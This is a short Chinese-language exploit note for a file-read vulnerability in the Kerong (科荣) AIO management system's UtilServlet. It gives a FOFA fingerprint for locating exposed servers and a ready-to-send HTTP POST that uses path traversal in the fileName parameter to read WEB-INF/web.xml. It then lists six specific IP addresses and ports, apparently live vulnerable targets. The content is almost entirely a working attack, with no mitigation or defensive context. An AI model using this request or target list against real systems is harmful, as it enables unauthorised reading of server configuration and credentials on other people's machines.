# 科荣 AIO 管理系统 UtilServlet 文件 fileName 参数文件读取漏洞

    ## fofa

```
body="changeAccount('8000')"
```

## poc

```
POST /UtilServlet HTTP/1.1
Host: 106.14.216.219:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencoded
Pragma: no-cache
Upgrade-Insecure-Requests: 1
Content-Length: 63

operation=readErrorExcel&fileName=../../website/WEB-INF/web.xml
```

http://106.14.216.219:8000/UtilServlet

http://106.14.216.219:8002/UtilServlet

http://112.74.13.69:9005/UtilServlet

http://112.74.13.69:9004/UtilServlet

http://113.104.196.166:8000/UtilServlet

http://113.118.86.7:8011/UtilServlet
